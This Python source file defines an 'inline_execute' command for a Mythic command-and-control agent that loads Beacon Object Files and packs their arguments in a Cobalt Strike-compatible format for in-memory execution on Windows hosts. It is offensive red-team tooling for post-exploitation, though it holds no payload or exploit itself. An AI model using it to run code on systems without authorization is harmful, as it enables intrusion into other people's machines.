from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import base64
import struct


def _split_bof_args(s: str) -> list[str]:
    """Split arguments on whitespace, respecting double quotes. Preserves backslashes."""
    args = []
    current = []
    in_quote = False
    for ch in s:
        if ch == '"':
            in_quote = not in_quote
        elif ch in (' ', '\t') and not in_quote:
            if current:
                args.append(''.join(current))
                current = []
        else:
            current.append(ch)
    if current:
        args.append(''.join(current))
    return args


def _bof_pack(fmt: str, args: list[str]) -> bytes:
    """Pack arguments into CS-compatible binary format for BOF consumption.
    Format chars: z=ANSI string, Z=wide string, i=int32, s=int16, b=binary(base64)
    """
    buf = b""
    arg_idx = 0
    for c in fmt:
        val = args[arg_idx] if arg_idx < len(args) else ""
        arg_idx += 1
        if c == "z":
            encoded = val.encode("utf-8") + b"\x00"
            buf += struct.pack("<I", len(encoded)) + encoded
        elif c == "Z":
            encoded = val.encode("utf-16-le") + b"\x00\x00"
            buf += struct.pack("<I", len(encoded)) + encoded
        elif c == "i":
            buf += struct.pack("<I", int(val) & 0xFFFFFFFF)
        elif c == "s":
            buf += struct.pack("<H", int(val) & 0xFFFF)
        elif c == "b":
            raw = base64.b64decode(val)
            buf += struct.pack("<I", len(raw)) + raw
    return buf


class InlineExecuteArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="bof_name",
                cli_name="BOF",
                display_name="BOF",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_bof_files,
                description="Previously registered BOF to execute",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="bof_file",
                display_name="New BOF",
                type=ParameterType.File,
                description="Upload a new BOF (.o COFF object file). After uploading, reuse via the Default tab.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="New",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="bof_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                default_value="",
                description="Arguments to pass to the BOF (space-separated, use quotes for strings with spaces)",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, group_name="Default", ui_position=2),
                    ParameterGroupInfo(required=False, group_name="New", ui_position=2),
                ],
            ),
            CommandParameter(
                name="argument_types",
                cli_name="ArgumentTypes",
                display_name="Argument Types",
                type=ParameterType.String,
                default_value="",
                description="CS bof_pack format string: z=ANSI string, Z=wide string, i=int32, s=int16, b=binary(b64). Default: one 'z' per argument.",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, group_name="Default", ui_position=3),
                    ParameterGroupInfo(required=False, group_name="New", ui_position=3),
                ],
            ),
        ]

    async def get_bof_files(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=inputMsg.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        response = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        if file_resp.Success:
            names = []
            for f in file_resp.Files:
                if f.Filename not in names and f.Filename.endswith(".o"):
                    names.append(f.Filename)
            response.Success = True
            response.Choices = names
        else:
            response.Error = file_resp.Error
        return response

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Require JSON arguments.\n\tUsage: {}".format(InlineExecuteCommand.help_cmd))


class InlineExecuteCommand(CommandBase):
    cmd = "inline_execute"
    needs_admin = False
    help_cmd = "inline_execute -BOF <bof.o> [-Arguments 'args']"
    description = "Execute a Beacon Object File (BOF) inline"
    version = 2
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1059"]
    argument_class = InlineExecuteArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )

        if taskData.args.get_parameter_group_name() == "New":
            file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                AgentFileID=taskData.args.get_arg("bof_file"),
            ))
            if not file_search.Success or len(file_search.Files) == 0:
                response.Success = False
                response.Error = "Failed to find uploaded BOF file"
                return response

            file_id = taskData.args.get_arg("bof_file")
            bof_name = file_search.Files[0].Filename
            taskData.args.add_arg("bof_name", bof_name)
            taskData.args.remove_arg("bof_file")
        else:
            bof_name = taskData.args.get_arg("bof_name")
            file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                Filename=bof_name,
                LimitByCallback=False,
                MaxResults=1,
            ))
            if not file_search.Success or len(file_search.Files) == 0:
                response.Success = False
                response.Error = f"Failed to find BOF '{bof_name}' in Mythic"
                return response
            file_id = file_search.Files[0].AgentFileId

        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get BOF content: {file_content.Error}"
            return response

        taskData.args.add_arg("bof_data", base64.b64encode(file_content.Content).decode(), ParameterType.String,
                              parameter_group_info=[
                                  ParameterGroupInfo(group_name="Default"),
                                  ParameterGroupInfo(group_name="New"),
                              ])

        bof_len = len(file_content.Content)
        arguments = taskData.args.get_arg("bof_arguments") or ""
        arg_types = taskData.args.get_arg("argument_types") or ""

        packed_args = b""
        if arguments:
            split_args = _split_bof_args(arguments)
            if not arg_types:
                arg_types = "z" * len(split_args)
            packed_args = _bof_pack(arg_types, split_args)

        taskData.args.add_arg("bof_args", base64.b64encode(packed_args).decode(), ParameterType.String,
                              parameter_group_info=[
                                  ParameterGroupInfo(group_name="Default"),
                                  ParameterGroupInfo(group_name="New"),
                              ])

        if arguments:
            response.DisplayParams = f"-BOF {bof_name} ({bof_len} bytes) -Arguments '{arguments}'"
        else:
            response.DisplayParams = f"-BOF {bof_name} ({bof_len} bytes)"

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
